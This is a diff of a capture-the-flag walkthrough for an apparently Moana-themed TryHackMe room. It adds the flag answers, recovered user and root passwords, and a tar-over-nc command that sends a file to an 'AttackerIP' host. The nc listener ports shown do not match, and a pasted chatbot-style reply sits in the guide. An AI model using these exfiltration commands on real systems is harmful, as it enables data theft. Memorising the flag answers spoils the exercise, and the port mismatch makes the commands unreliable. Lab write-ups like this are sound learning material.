@@ -19,9 +19,9 @@ Date: 2026-05-27
 ## Flags/Tasks
 ### Task 1
 1. What is the user flag?
-	- *...*
+	- *THM{m0an4_0f_M0tunu1}*
 2. What is the root flag?
-	- *...*
+	- *THM{h34rT_r35T0r3d}*
 
 ---
 # Preparation
@@ -155,7 +155,8 @@ nc -lnvp 4444
 
 ## SSH login
 
-Manually enumerating with the reverse shell reveals two users, `moana` and `network`. The network user is simply a user for file sharing. The user `moana` on the other hand contains a file called `read_me` with the following text:
+Manually enumerating with the reverse shell reveals two users, **`moana`** and *`network`*. The network user is simply a user for file sharing. The user moana on the other hand contains a file called `read_me` with text mentioning that the user is reusing her credentials:
+
 ```
 I know you've been on vacation and the last thing you want is me nagging you.
 
@@ -164,15 +165,15 @@ But will you please consider not using the same password for all services? It pu
 I have started planning the new network design in packet tracer, and since you're 'the best engineer this island has seen', go find it and finish it.
 ```
 
-There is also a `user.txt` file that isn't readable by the web server, however the credentials of the user can eventually be found through finding the packet tracer file which we can find in the `/etc` directory as `/network.pkt`.
-
+There is also a *`user.txt`* file that is not readable by the web server, however the credentials of the user can eventually be found through finding the packet tracer file which we can find in the *`/etc`* directory as **`/network.pkt`**.
 
 >[!Note]
 > The file requires the cisco packet tracer software.
 
-We can analyze the file after using `nc` to transfer the file then using cisco packet tracer. Using cisco packet tracer and inspecting the switch leads to the credentials of the user `moana`. Since it was hinted that the user `moana` reuses credentials, the same credentials can be used to log in with SSH.
+We can analyze the file after using `nc` to transfer the file then using cisco packet tracer. Using cisco packet tracer and inspecting the switch leads to the users credentials when inspecting the config with the **`show running-config`** in the CLI.
 
-Guide :
+### Cisco CLI step by step guide :
+
 ```
 Step 1: Open the Switch Menu
 
@@ -203,22 +204,27 @@ Step 5: Navigate and Read the Output
 
 What **specific setting** are you looking for inside this configuration file? I can tell you **exactly what keyword** to scroll down and look for.
 ```
-
+### Credentials:
 ```
 username moana privilege 1 password 0 HOwF4ri'LLGO
 ```
 
 >[!Tip]
->Transferring the file can be easily done with the following commands:
->On Target
+>To transfer a file form a Linux target, the shortest method is using the **`tar`** command.
+>On Target:
 >```
 >tar -czf - network.pkt | nc AttackerIP 1234
 >```
 >On Attacker
->```
+>```:
 >nc -lnvp 443 > network_file.tar.gz
 >```
 
-After logging in to SSH, we can easily find the user flag in `user.txt`.
+After logging in to SSH, we can easily find the user flag in **`user.txt`**.
 
 ## Root access
+The server is already susceptible to privilege escalation attacks, but a simpler method is to simply enumerate the site and inspect previously inaccessible elements. When enumerating through the server, there **HTTPS encryption** keys that were found in the `/etc` directory, We can use these keys to [decrypt **SSL traffic** in Wireshark](https://www.comparitech.com/net-admin/decrypt-ssl-with-wireshark/?source=post_page-----a73032b26705---------------------------------------). This allows us to inspect an HTTP request containing the root credentials.
+
+```
+Pl3aseW0rk
+```
